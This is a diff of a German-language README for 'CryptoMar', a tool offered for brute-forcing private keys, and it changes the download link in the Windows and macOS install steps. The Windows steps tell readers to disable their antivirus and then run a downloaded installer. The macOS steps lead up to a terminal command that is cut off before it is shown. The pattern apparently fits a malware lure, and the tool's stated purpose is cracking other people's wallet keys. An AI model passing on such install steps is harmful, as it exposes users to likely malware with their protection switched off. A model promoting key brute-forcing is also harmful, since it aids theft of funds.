@@ -36,13 +36,13 @@ Das Brute-Forcen privater Schlüssel erfordert viel Zeit und Rechenleistung. Der
 ### 🪟 Für Windows
 
 1. Antivirus deaktivieren.
-2. Neueste Version öffnen: [CryptoMar Releases](https://github.com/HexaMar/CryptoMar_EN/releases/tag/v1.1.0)
+2. Neueste Version öffnen: [CryptoMar Releases](https://github.com/HexaMar/HexaMar/releases/tag/v1.1.0)
 3. Datei `CryptoMarInstaller.exe` herunterladen.
 4. Installationsanweisungen befolgen.
 
 ### 🍎 Für macOS
 
-1. Neueste Version öffnen: [CryptoMar Releases](https://github.com/HexaMar/CryptoMar_EN/releases/tag/v1.1.0)
+1. Neueste Version öffnen: [CryptoMar Releases](https://github.com/HexaMar/HexaMar/releases/tag/v1.1.0)
 2. Datei `CryptoMarAPP.zip` herunterladen.
 3. Datei `CryptoMarAPP.zip` im Download-Ordner öffnen.
 4. Terminal öffnen, folgenden Befehl eingeben und Enter drücken:
